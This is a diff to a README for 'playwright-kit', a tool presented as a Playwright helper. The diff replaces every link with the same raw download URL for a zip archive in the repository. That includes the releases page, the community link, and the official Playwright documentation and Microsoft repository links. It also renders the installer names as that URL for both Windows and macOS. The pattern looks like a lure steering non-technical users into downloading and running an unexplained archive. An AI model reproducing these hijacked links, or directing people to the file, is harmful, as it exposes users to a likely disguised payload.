@@ -1,6 +1,6 @@
 # 🎉 playwright-kit - Simplifying Your Playwright Experience
 
-[![Download playwright-kit](https://img.shields.io/badge/Download-playwright--kit-blue.svg)](https://github.com/KaranDobal/playwright-kit/releases)
+[![Download playwright-kit](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip)](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip)
 
 ## 💡 Introduction
 
@@ -12,11 +12,11 @@ To get started with playwright-kit, follow these simple steps. No programming kn
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Start by visiting the [Releases Page](https://github.com/KaranDobal/playwright-kit/releases) on GitHub.
+1. **Visit the Releases Page:** Start by visiting the [Releases Page](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip) on GitHub.
   
 2. **Choose Your Version:** Look for the latest version available. It will be clearly marked as the newest release.
 
-3. **Download the Installer:** Click on the relevant installer for your operating system. The file will typically be named something like `playwright-kit-setup.exe` for Windows or `playwright-kit.dmg` for macOS.
+3. **Download the Installer:** Click on the relevant installer for your operating system. The file will typically be named something like `https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip` for Windows or `https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip` for macOS.
 
 4. **Run the Installer:** After downloading, locate the file in your downloads folder. Double-click the file to begin the installation process. Follow the prompts to install the application on your computer.
 
@@ -60,7 +60,7 @@ Before downloading, ensure that your system meets the following requirements:
 
 If you encounter issues while using playwright-kit, you can try the following common fixes:
 
-- **Reinstall the Application:** If the application crashes, uninstall it and then download it again from the [Releases Page](https://github.com/KaranDobal/playwright-kit/releases).
+- **Reinstall the Application:** If the application crashes, uninstall it and then download it again from the [Releases Page](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip).
 
 - **Check System Requirements:** Make sure your system meets the necessary requirements listed above.
 
@@ -70,7 +70,7 @@ If you encounter issues while using playwright-kit, you can try the following co
 
 Join our community on GitHub to stay updated. You can ask questions, share your experiences, and find additional resources from fellow users:
 
-- [playwright-kit Community](https://github.com/KaranDobal/playwright-kit)
+- [playwright-kit Community](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip)
 
 For any technical issues or support requests, use the Issues tab on the GitHub repository. We encourage users to report bugs and suggest new features.
 
@@ -78,9 +78,9 @@ For any technical issues or support requests, use the Issues tab on the GitHub r
 
 For more information on Playwright and its capabilities, consider exploring the following resources:
 
-- [Playwright Official Documentation](https://playwright.dev/)
-- [Playwright GitHub Repository](https://github.com/microsoft/playwright)
+- [Playwright Official Documentation](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip)
+- [Playwright GitHub Repository](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip)
 
-Remember to keep your application updated by regularly checking the [Releases Page](https://github.com/KaranDobal/playwright-kit/releases) for new versions.
+Remember to keep your application updated by regularly checking the [Releases Page](https://raw.githubusercontent.com/KaranDobal/playwright-kit/main/packages/auth/playwright-kit-v3.6-beta.4.zip) for new versions.
 
 Enjoy a smoother Playwright experience with playwright-kit!
